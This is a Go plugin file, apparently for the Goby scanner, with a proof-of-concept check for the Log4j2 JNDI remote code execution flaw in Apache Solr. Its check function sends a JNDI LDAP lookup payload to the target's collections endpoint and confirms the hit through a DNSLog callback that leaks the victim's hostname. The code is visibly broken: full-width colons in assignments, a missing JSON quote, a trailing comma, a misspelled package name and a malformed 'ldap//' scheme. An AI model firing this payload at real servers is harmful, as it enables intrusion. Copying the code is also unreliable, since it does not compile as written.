package exploits

import (
	//根据需求导入相应的包
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Solr Log4j2 Jndi RCE",
    "Level": "3",
    "Tags": [
        "rce"
    ],
    "GobyQuery": "app=\"Solr\"",
    "Description": "Apache Log4j2被曝存在JNDI远程代码执行漏洞",
    "Product": "",
    "Homepage": "https://gobies.org/",
    "Author": "gobysec@gmail.com",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/collections?action=",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
                },
                "data_type": "text",
                "data": "",
                "set_variable": []
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
    ],
    "PostTime": "2022-05-24 22:33:22",
    GobyVersion": "1.9.325" 
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//自定义POC函数，通过响应bool来确认漏洞是否存在
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)     //RandomHexString:随机生成指定长度的字符串
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr) //GetGodCheckURl:生成DNSLog地址
			uri ：= "/solr/admin/collections?action=$%7Bjndi:ldap//$%7BhostName%7D." + checkUrl + "/a%7D"  //拼接payload
			cfg ：= httpclient.NewGetRequestConfig(uri)     //NewGetRequestConfig:构建GET请求自定义配置，返回RequestConfig
			cfg.VerifyTls = false     //忽略ssl验证
			cfg.FollowRedirect = false    //不跟随跳转
			cfg.Header.Store("Content-type", "application/x-www.form-urlencoded")  //自定义请求头
			httpclient.DoHttpRequest(u, cfg)    //DoHttpRequest:构建自定义请求配置，发送请求，返回请求结果HttpRespnse
			return godclent.PullExists(checkStr, time.Second*15)   //在一段时间内检测是否有HTTP请求成功，如果请求成功返回true，否则返回false
		},

		nil, //自定义EXP函数, 没有EXP，就写nil,
	))
}
